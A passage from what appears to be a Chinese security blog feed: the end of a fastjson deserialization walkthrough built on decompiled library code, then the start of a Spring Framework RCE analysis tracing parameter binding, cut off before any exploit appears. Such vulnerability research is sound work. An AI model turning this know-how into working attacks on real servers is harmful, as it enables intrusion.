class="keyword">this</span>.asmEnable;</span><br><span class="line">    <span class="keyword">if</span> (asmEnable) &#123;</span><br><span class="line">        JSONType jsonType = (JSONType)clazz.getAnnotation(JSONType.class);</span><br><span class="line">        Class superClass;</span><br><span class="line">        <span class="keyword">if</span> (jsonType != <span class="keyword">null</span>) &#123;</span><br><span class="line">            superClass = jsonType.deserializer();</span><br><span class="line">            <span class="keyword">if</span> (superClass != Void.class) &#123;</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    Object deseralizer = superClass.newInstance();</span><br><span class="line">                    <span class="keyword">if</span> (deseralizer <span class="keyword">instanceof</span> ObjectDeserializer) &#123;</span><br><span class="line">                        <span class="keyword">return</span> (ObjectDeserializer)deseralizer;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125; <span class="keyword">catch</span> (Throwable var16) &#123;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            asmEnable = jsonType.asm();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (asmEnable) &#123;</span><br><span class="line">            superClass = JavaBeanInfo.getBuilderClass(jsonType);</span><br><span class="line">            <span class="keyword">if</span> (superClass == <span class="keyword">null</span>) &#123;</span><br><span class="line">                superClass = clazz;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">do</span> &#123;</span><br><span class="line">                <span class="keyword">if</span> (!Modifier.isPublic(superClass.getModifiers())) &#123;</span><br><span class="line">                    asmEnable = <span class="keyword">false</span>;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                superClass = superClass.getSuperclass();</span><br><span class="line">            &#125; <span class="keyword">while</span>(superClass != Object.class &amp;&amp; superClass != <span class="keyword">null</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (clazz.getTypeParameters().length != <span class="number">0</span>) &#123;</span><br><span class="line">        asmEnable = <span class="keyword">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (asmEnable &amp;&amp; <span class="keyword">this</span>.asmFactory != <span class="keyword">null</span> &amp;&amp; <span class="keyword">this</span>.asmFactory.classLoader.isExternalClass(clazz)) &#123;</span><br><span class="line">        asmEnable = <span class="keyword">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (asmEnable) &#123;</span><br><span class="line">        asmEnable = ASMUtils.checkName(clazz.getSimpleName());</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    JavaBeanInfo beanInfo;</span><br><span class="line">    <span class="keyword">if</span> (asmEnable) &#123;</span><br><span class="line">        <span class="keyword">if</span> (clazz.isInterface()) &#123;</span><br><span class="line">            asmEnable = <span class="keyword">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        beanInfo = JavaBeanInfo.build(clazz, type, <span class="keyword">this</span>.propertyNamingStrategy);</span><br><span class="line">        <span class="keyword">if</span> (asmEnable &amp;&amp; beanInfo.fields.length &gt; <span class="number">200</span>) &#123;</span><br><span class="line">            asmEnable = <span class="keyword">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        Constructor&lt;?&gt; defaultConstructor = beanInfo.defaultConstructor;</span><br><span class="line">        <span class="keyword">if</span> (asmEnable &amp;&amp; defaultConstructor == <span class="keyword">null</span> &amp;&amp; !clazz.isInterface()) &#123;</span><br><span class="line">            asmEnable = <span class="keyword">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        FieldInfo[] var18 = beanInfo.fields;</span><br><span class="line">        <span class="keyword">int</span> var7 = var18.length;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> var8 = <span class="number">0</span>; var8 &lt; var7; ++var8) &#123;</span><br><span class="line">            FieldInfo fieldInfo = var18[var8];</span><br><span class="line">            <span class="keyword">if</span> (fieldInfo.getOnly) &#123;</span><br><span class="line">                asmEnable = <span class="keyword">false</span>;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            Class&lt;?&gt; fieldClass = fieldInfo.fieldClass;</span><br><span class="line">            <span class="keyword">if</span> (!Modifier.isPublic(fieldClass.getModifiers())) &#123;</span><br><span class="line">                asmEnable = <span class="keyword">false</span>;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (fieldClass.isMemberClass() &amp;&amp; !Modifier.isStatic(fieldClass.getModifiers())) &#123;</span><br><span class="line">                asmEnable = <span class="keyword">false</span>;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (fieldInfo.getMember() != <span class="keyword">null</span> &amp;&amp; !ASMUtils.checkName(fieldInfo.getMember().getName())) &#123;</span><br><span class="line">                asmEnable = <span class="keyword">false</span>;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            JSONField annotation = fieldInfo.getAnnotation();</span><br><span class="line">            <span class="keyword">if</span> (annotation != <span class="keyword">null</span> &amp;&amp; (!ASMUtils.checkName(annotation.name()) || annotation.format().length() != <span class="number">0</span> || annotation.deserializeUsing() != Void.class)) &#123;</span><br><span class="line">                asmEnable = <span class="keyword">false</span>;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (fieldClass.isEnum()) &#123;</span><br><span class="line">                ObjectDeserializer fieldDeser = <span class="keyword">this</span>.getDeserializer((Type)fieldClass);</span><br><span class="line">                <span class="keyword">if</span> (!(fieldDeser <span class="keyword">instanceof</span> EnumDeserializer)) &#123;</span><br><span class="line">                    asmEnable = <span class="keyword">false</span>;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (asmEnable &amp;&amp; clazz.isMemberClass() &amp;&amp; !Modifier.isStatic(clazz.getModifiers())) &#123;</span><br><span class="line">        asmEnable = <span class="keyword">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!asmEnable) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> JavaBeanDeserializer(<span class="keyword">this</span>, clazz, type);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        beanInfo = JavaBeanInfo.build(clazz, type, <span class="keyword">this</span>.propertyNamingStrategy);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">this</span>.asmFactory.createJavaBeanDeserializer(<span class="keyword">this</span>, beanInfo);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (NoSuchMethodException var13) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">new</span> JavaBeanDeserializer(<span class="keyword">this</span>, clazz, type);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (JSONException var14) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">new</span> JavaBeanDeserializer(<span class="keyword">this</span>, beanInfo);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception var15) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> JSONException(<span class="string">&quot;create asm deserializer error, &quot;</span> + clazz.getName(), var15);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><pre><code>  - `Method`的一系列判断，是否大于4，是否不是静态方法，返回类型是否为void或是否为当前类的类型  - 获取`Method`的参数的类型，如果参数类型的数组等于1，     - 获取参数的类的注解及父类的注解`method.getAnnotation(JSONField.class)`，如果不为空，且判断annotation.deserialize()</code></pre><p>是否为false，则继续循环</p><pre><code>  - 判断方法名是否为`set`开头，且第三个字符是否为大写及是否小于`512`，如果不是大写，判断是否为`_`，如果不是`_`，继续判断是否是`f`，如果都不是，继续判断`MethodName`是否小于`5`，第四个字符是否是大写  - `propertyName = Character.toLowerCase(methodName.charAt(3)) + methodName.substring(4);`  - 通过`propertyName`获取对应的`Field`  - 如果`field`为空且字段类型是`Boolean`  - 同样判断一下`field`是否有`Annotation`  - 向添加`fieldList`中添加`FieldInfo(propertyName, method, field, clazz, type, ordinal, serialzeFeatures, parserFeatures, annotation, fieldAnnotation, (String)null);`，实例化`FieldInfo`的过程中，会完成一些操作，比如`Field`修改可访问属性，因此私有的`Field`也可以使用  - 又获取了Methods，是这样的判断条件，     - 大于4     - 不是静态方法     - 以`get`开头     - 第三个字符大写     - 不带参数     - 返回类型是不是`Collection.class`、`Map.class`、`AtomicBoolean.class`、`AtomicInteger.class`、`AtomicLong.class`  - 返回实例化的`JavaBeanInfo`</code></pre><ul><li><p>判断字段数量不能大于200</p></li><li><p>遍历字段，判断字段类型对应的类是否为<code>Public</code>，这里是不需要为Public，比如<code>private String name;</code></p><ul><li>是否不是<code>Public</code>修饰符</li><li>是否为<code>Member</code>类</li><li>是否是枚举类型<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">methodName.length() &gt;= <span class="number">4</span> &amp;&amp; !Modifier.isStatic(method.getModifiers()) &amp;&amp; methodName.startsWith(<span class="string">&quot;get&quot;</span>) &amp;&amp; Character.isUpperCase(methodName.charAt(<span class="number">3</span>)) &amp;&amp; method.getParameterTypes().length == <span class="number">0</span> &amp;&amp; (Collection.class.isAssignableFrom(method.getReturnType()) || Map.class.isAssignableFrom(method.getReturnType()) || AtomicBoolean.class == method.getReturnType() || AtomicInteger.class == method.getReturnType() || AtomicLong.class == method.getReturnType())</span><br></pre></td></tr></table></figure><div align=center><img src="/img/fastjson序列化和反序列化/18.png" alt="18" style="zoom:50%;" /></div></li></ul></li><li><p>此时返回<code>this.asmFactory.createJavaBeanDeserializer(this, beanInfo);</code></p></li><li><p>判断<code>Clazz</code>是否为基本类型，比如int，如果是抛出异常</p></li><li><p>创建一个类，类名格式：<code>FastjsonASMDeserializer_1_User</code>，全称：<code>com.alibaba.fastjson.parser.deserializer.FastjsonASMDeserializer_1_User</code></p></li><li><p>创建<code>ClassWriter()</code>，可以看出通过<code>defineClassPublic</code>创建这个类；最终通过ASM创建了一个JavaBeanDeserializer类型的类，将config和beanInfo传入构造方法</p></li><li><p>将<code>type</code>和<code>derializer</code>映射关系放入<code>derializers</code>中，估计是留着备用</p></li></ul><p></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> ObjectDeserializer <span class="title">createJavaBeanDeserializer</span><span class="params">(ParserConfig config, JavaBeanInfo beanInfo)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">    Class&lt;?&gt; clazz = beanInfo.clazz;</span><br><span class="line">    <span class="keyword">if</span> (clazz.isPrimitive()) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> IllegalArgumentException(<span class="string">&quot;not support type :&quot;</span> + clazz.getName());</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        String className = <span class="string">&quot;FastjsonASMDeserializer_&quot;</span> + <span class="keyword">this</span>.seed.incrementAndGet() + <span class="string">&quot;_&quot;</span> + clazz.getSimpleName();</span><br><span class="line">        String packageName = ASMDeserializerFactory.class.getPackage().getName();</span><br><span class="line">        String classNameType = packageName.replace(<span class="string">&#x27;.&#x27;</span>, <span class="string">&#x27;/&#x27;</span>) + <span class="string">&quot;/&quot;</span> + className;</span><br><span class="line">        String classNameFull = packageName + <span class="string">&quot;.&quot;</span> + className;</span><br><span class="line">        ClassWriter cw = <span class="keyword">new</span> ClassWriter();</span><br><span class="line">        cw.visit(<span class="number">49</span>, <span class="number">33</span>, classNameType, ASMUtils.type(JavaBeanDeserializer.class), (String[])<span class="keyword">null</span>);</span><br><span class="line">        <span class="keyword">this</span>._init(cw, <span class="keyword">new</span> ASMDeserializerFactory.Context(classNameType, config, beanInfo, <span class="number">3</span>));</span><br><span class="line">        <span class="keyword">this</span>._createInstance(cw, <span class="keyword">new</span> ASMDeserializerFactory.Context(classNameType, config, beanInfo, <span class="number">3</span>));</span><br><span class="line">        <span class="keyword">this</span>._deserialze(cw, <span class="keyword">new</span> ASMDeserializerFactory.Context(classNameType, config, beanInfo, <span class="number">5</span>));</span><br><span class="line">        <span class="keyword">this</span>._deserialzeArrayMapping(cw, <span class="keyword">new</span> ASMDeserializerFactory.Context(classNameType, config, beanInfo, <span class="number">4</span>));</span><br><span class="line">        <span class="keyword">byte</span>[] code = cw.toByteArray();</span><br><span class="line">        Class&lt;?&gt; exampleClass = <span class="keyword">this</span>.defineClassPublic(classNameFull, code, <span class="number">0</span>, code.length);</span><br><span class="line">        Constructor&lt;?&gt; constructor = exampleClass.getConstructor(ParserConfig.class, JavaBeanInfo.class);</span><br><span class="line">        Object instance = constructor.newInstance(config, beanInfo);</span><br><span class="line">        <span class="keyword">return</span> (ObjectDeserializer)instance;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="2-2-4-com-alibaba-fastjson-parser-deserializer"><a href="#2-2-4-com-alibaba-fastjson-parser-deserializer" class="headerlink" title="2.2.4  com.alibaba.fastjson.parser.deserializer#"></a>2.2.4  com.alibaba.fastjson.parser.deserializer#</h4><p>获取<code>deserializer</code>后，调用<code>deserializer.deserialze((DefaultJSONParser)this, clazz, fieldName);</code><br>此时再跟踪已经跟踪不了了，因为执行<code>deserialze</code>方法的是 创建的<code>FastjsonASMDeserializer_1_User</code>对象，这个对象我们跟踪不到；<br>这个对象对应的类是 <code>com.alibaba.fastjson.parser.deserializer#deserialze</code></p><ol><li>只能暂时静态分析，在循环获取字符串中<code>key</code>的过程中，如果仍然遇到<code>@type</code>，继续获取<code>deserizer.deserialze</code>方法进行解析</li></ol><center align=center><img src="/img/fastjson序列化和反序列化/19.png" alt="19" style="zoom:50%;" /></center><img src="/img/fastjson序列化和反序列化/20.png" alt="20" style="zoom:50%;" /><h4 id="2-2-5-参数赋值"><a href="#2-2-5-参数赋值" class="headerlink" title="2.2.5 参数赋值"></a>2.2.5 参数赋值</h4><p>这里根据<code>JavaBeanDeserializer</code>的构造方法得知，<code>fieldDeser</code>对应的是<code>DefaultFieldDeserializer</code>类型</p><ul><li>赋值的流程是 <code>DefaultFieldDeserializer#parseField()</code>方法 -&gt; <code>FieldDeserializer#setValue</code><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setValue</span><span class="params">(Object object, Object value)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (value == <span class="keyword">null</span> <span class="comment">//</span></span><br><span class="line">        &amp;&amp; fieldInfo.fieldClass.isPrimitive()) &#123;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        Method method = fieldInfo.method;</span><br><span class="line">        <span class="keyword">if</span> (method != <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (fieldInfo.getOnly) &#123;</span><br><span class="line">                <span class="keyword">if</span> (fieldInfo.fieldClass == AtomicInteger.class) &#123;</span><br><span class="line">                    AtomicInteger atomic = (AtomicInteger) method.invoke(object);</span><br><span class="line">                    <span class="keyword">if</span> (atomic != <span class="keyword">null</span>) &#123;</span><br><span class="line">                        atomic.set(((AtomicInteger) value).get());</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125; <span class="keyword">else</span> <span class="keyword">if</span> (fieldInfo.fieldClass == AtomicLong.class) &#123;</span><br><span class="line">                    AtomicLong atomic = (AtomicLong) method.invoke(object);</span><br><span class="line">                    <span class="keyword">if</span> (atomic != <span class="keyword">null</span>) &#123;</span><br><span class="line">                        atomic.set(((AtomicLong) value).get());</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125; <span class="keyword">else</span> <span class="keyword">if</span> (fieldInfo.fieldClass == AtomicBoolean.class) &#123;</span><br><span class="line">                    AtomicBoolean atomic = (AtomicBoolean) method.invoke(object);</span><br><span class="line">                    <span class="keyword">if</span> (atomic != <span class="keyword">null</span>) &#123;</span><br><span class="line">                        atomic.set(((AtomicBoolean) value).get());</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125; <span class="keyword">else</span> <span class="keyword">if</span> (Map.class.isAssignableFrom(method.getReturnType())) &#123;</span><br><span class="line">                    Map map = (Map) method.invoke(object);</span><br><span class="line">                    <span class="keyword">if</span> (map != <span class="keyword">null</span>) &#123;</span><br><span class="line">                        map.putAll((Map) value);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    Collection collection = (Collection) method.invoke(object);</span><br><span class="line">                    <span class="keyword">if</span> (collection != <span class="keyword">null</span>) &#123;</span><br><span class="line">                        collection.addAll((Collection) value);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                method.invoke(object, value);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">final</span> Field field = fieldInfo.field;</span><br><span class="line">            </span><br><span class="line">            <span class="keyword">if</span> (fieldInfo.getOnly) &#123;</span><br><span class="line">                <span class="keyword">if</span> (fieldInfo.fieldClass == AtomicInteger.class) &#123;</span><br><span class="line">                    AtomicInteger atomic = (AtomicInteger) field.get(object);</span><br><span class="line">                    <span class="keyword">if</span> (atomic != <span class="keyword">null</span>) &#123;</span><br><span class="line">                        atomic.set(((AtomicInteger) value).get());</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125; <span class="keyword">else</span> <span class="keyword">if</span> (fieldInfo.fieldClass == AtomicLong.class) &#123;</span><br><span class="line">                    AtomicLong atomic = (AtomicLong) field.get(object);</span><br><span class="line">                    <span class="keyword">if</span> (atomic != <span class="keyword">null</span>) &#123;</span><br><span class="line">                        atomic.set(((AtomicLong) value).get());</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125; <span class="keyword">else</span> <span class="keyword">if</span> (fieldInfo.fieldClass == AtomicBoolean.class) &#123;</span><br><span class="line">                    AtomicBoolean atomic = (AtomicBoolean) field.get(object);</span><br><span class="line">                    <span class="keyword">if</span> (atomic != <span class="keyword">null</span>) &#123;</span><br><span class="line">                        atomic.set(((AtomicBoolean) value).get());</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125; <span class="keyword">else</span> <span class="keyword">if</span> (Map.class.isAssignableFrom(fieldInfo.fieldClass)) &#123;</span><br><span class="line">                    Map map = (Map) field.get(object);</span><br><span class="line">                    <span class="keyword">if</span> (map != <span class="keyword">null</span>) &#123;</span><br><span class="line">                        map.putAll((Map) value);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    Collection collection = (Collection) field.get(object);</span><br><span class="line">                    <span class="keyword">if</span> (collection != <span class="keyword">null</span>) &#123;</span><br><span class="line">                        collection.addAll((Collection) value);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">if</span> (field != <span class="keyword">null</span>) &#123;</span><br><span class="line">                    field.set(object, value);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> JSONException(<span class="string">&quot;set property error, &quot;</span> + fieldInfo.name, e);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul><p><strong><em>实际是通过遍历</em></strong><code>fieldInfo</code><strong><em>进行赋值，如果有</em></strong><code>setXXX</code><strong><em>方法，则通过反射调用，如果没有则通过反射对响应的</em></strong><code>Field</code><strong><em>进行赋值</em></strong></p><div align=center><img src="/img/fastjson序列化和反序列化/21.png" alt="21" style="zoom: 50%;" /></div><p>最终返回了一个实例化的Object对象</p>]]></content>
      
      
      <categories>
          
          <category> 攻防研究 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 漏洞分析 - fastjson </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Spring Framework RCE分析</title>
      <link href="/2022/04/02/Spring%20Framework%20RCE%E5%88%86%E6%9E%90/"/>
      <url>/2022/04/02/Spring%20Framework%20RCE%E5%88%86%E6%9E%90/</url>
      
        <content type="html"><![CDATA[<h2 id="0x01-前言"><a href="#0x01-前言" class="headerlink" title="0x01 前言"></a>0x01 前言</h2><p>&emsp;&emsp;因为第一次调试spring框架，首先分析spring的参数绑定，从预警和后来的poc来看，和spring的参数绑定有关系</p><h2 id="0x02参数绑定流程"><a href="#0x02参数绑定流程" class="headerlink" title="0x02参数绑定流程"></a>0x02参数绑定流程</h2><p>&emsp;&emsp;先记录几个单词的意思</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Handler:    [&#39;hændlə] 处理者、处理程序</span><br><span class="line">Disptacher: [dis&#39;pætʃə] 调度员、调度程序</span><br><span class="line">Mapping:    [&#39;mæpiŋ] 映射</span><br><span class="line">Adapter:    [ə&#39;dæptə]  适配器</span><br><span class="line">Argument:   [&#39;ɑ:ɡjumənt] 逻辑论证</span><br></pre></td></tr></table></figure><h3 id="1-Spring运行流程图"><a href="#1-Spring运行流程图" class="headerlink" title="1. Spring运行流程图"></a>1. Spring运行流程图</h3><img src="/img/Spring Framework RCE分析/image-20220403000622503.png" alt="image-20220403000622503" style="zoom: 33%;" /><h3 id="2-统一调度方法"><a href="#2-统一调度方法" class="headerlink" title="2. 统一调度方法"></a>2. 统一调度方法</h3><p>&emsp;&emsp;先找到统一的调度器方法，并设置断点org/springframework/web/servlet/DispatcherServlet.class#doDispatch()<br>图中三个断点位置</p><ul><li>第一个<code>this.checkMultipart()</code> ，这里看到就断下来了，我记得之前有个漏洞好像和这个有关系。判断是否是上传包</li><li>第二个断点是<code>HandlerAdapter</code>的初始化；这里看到下面还有一个判断是否是Get或HEAD方法，并判断是否支持这个方法</li><li>第三个断点即进入<code>HandlerAdapter</code>的处理方法，HandlerAdapter.handle</li></ul><img src="/img/Spring Framework RCE分析/image-20220403000650938.png" alt="image-20220403000650938" style="zoom: 50%;" /><h3 id="3-处理适配器的处理方法"><a href="#3-处理适配器的处理方法" class="headerlink" title="3. 处理适配器的处理方法"></a>3. 处理适配器的处理方法</h3><p>&emsp;&emsp;步入上面ha.handle()的处理方法中，通过<code>this.invokeHandlerMethod()</code>方法获取熟悉的ModelAndView对象</p><img src="/img/Spring Framework RCE分析/image-20220403000717238.png" alt="image-20220403000717238" style="zoom: 50%;" /><h3 id="4-调用与处理"><a href="#4-调用与处理" class="headerlink" title="4. 调用与处理"></a>4. 调用与处理</h3><p>&emsp;&emsp;继上一步，进入org/springframework/web/servlet/mvc/method/annotation/RequestMappingHandlerAdapter.invokeHandlerMethod ，图中断点位置进入<code>invokeAndHandle</code>（调用和处理）方法，断点前是一些ModelAndViewContainer和AsyncWebRequest对象的初始化</p><img src="/img/Spring Framework RCE分析/image-20220403000749580.png" alt="image-20220403000749580" style="zoom:50%;" /><p>&emsp;&emsp;接着进入invokeAndHandle方法后，首先执行的就是<code>invokeForRequest</code></p><p>![image-20220403000808200](/img/Spring Framework RCE分析/image-20220403000808200.png)</p><p>&emsp;&emsp;下一步进入invokeForRequest方法，这里从字面上可以看出下一步是获取方法的值<code>（this.getMethodArgumentValues）</code></p><img src="/img/Spring Framework RCE分析/image-20220403000823543.png" alt="image-20220403000823543" style="zoom:50%;" /><h3 id="5-进入参数绑定"><a href="#5-进入参数绑定" class="headerlink" title="5. 进入参数绑定"></a>5. 进入参数绑定</h3><p>a. 进入上一步的 <code>getMethodArgumentValues()</code> 在<code>this.resolvers.resolveArgument</code> 方法设置断点</p><img src="/img/Spring Framework RCE分析/image-20220403000839778.png" alt="image-20220403000839778" style="zoom: 50%;" /><p>b. 进入该方法，执行到</p><p>org/springframework/web/method/annotation/ModelAttributeMethodProcessor#resolveArgument 在图中断点位置，可以看到<code>bindRequestParameters()</code>，可以把它理解为”绑定请求参数”</p><img src="/img/Spring Framework RCE分析/image-20220403000911356.png" alt="image-20220403000911356" style="zoom:50%;" /><p>c. 指定到DataBinder#doBind()方法，进入<code>this.applyPropertyValues()</code></p><img src="/img/Spring Framework RCE分析/image-20220403000954194.png" alt="image-20220403000954194" style="zoom:50%;" /><img src="/img/Spring Framework RCE分析/image-20220403001037708.png" alt="image-20220403001037708" style="zoom:50%;" /><p>d. 跟入<code>setPropertyValue </code>方法，可以看到nestedPa是一个封装了Object[POJO.Student]的BeanWrapperImpl对象</p><img src="/img/Spring Framework RCE分析/image-20220403001137387.png" alt="image-20220403001137387" style="zoom:50%;" /><h2 id="0x02-漏洞分析"><a href="#0x02-漏洞分析" class="headerlink" title="0x02 漏洞分析"></a>0x02 漏洞分析</h2><p>  &emsp;&emsp;这里笔记分割的比较突然，主要是因为下面的流程就慢慢和漏洞有关联</p><h3 id="1-参数名的分割处理"><a href="#1-参数名的分割处理" class="headerlink" title="1. 参数名的分割处理"></a>1. 参数名的分割处理</h3><p>a. 先是接上上面参数绑定的执行流程中，<code>setPropertyValue</code>方法，如图所示通过</p><img src="/img/Spring Framework RCE分析/image-20220403001152332.png" alt="image-20220403001152332" style="zoom:50%;" /><p>b. 通过PropertyAccessorUtils.getFirstNestedPropertySeparatorIndex(propertyPath) 计算pos为5，查看getFirstNestedPropertySeparatorIndex计算的方法，这里是计算第一个字符到第一个. 中间字符的个数，再进行分割，如class.x pos就是5，去除class</p><ul><li><p>关键位置还是<code>this.getNestedPropertyAccessor(nestedProperty)</code>在循环处理</p><img src="/img/Spring Framework RCE分析/image-20220403001209942.png" alt="image-20220403001209942" style="zoom:50%;" /></li></ul><h3 id="2-参数绑定的意外情况"><a href="#2-参数绑定的意外情况" class="headerlink" title="2. 参数绑定的意外情况"></a>2. 参数绑定的意外情况</h3><ul><li>继续调试，在参数绑定的流程中，发现除了当前POJO对象的一些字段以外，多了一个class字段</li><li>这里为了防止混淆，重新提交<code>id.x=666&amp;name=nine</code>这样类型的参数，继续调试，进入<code>getNestedPropertyAccessor</code>方法</li></ul><p>a. 继续步入，程序通过getPropertyValue获取一个Object，tokens在前面是nestedProperty的格式化效验，也就是参数中的id</p><img src="/img/Spring Framework RCE分析/image-20220403001226852.png" alt="image-20220403001226852" style="zoom:50%;" /><p>b. 进入该方法，指定到<code>getLocalPropertyHandler</code>，关注一下这段代码的执行</p><img src="/img/Spring Framework RCE分析/image-20220403001303500.png" alt="image-20220403001303500" style="zoom:50%;" 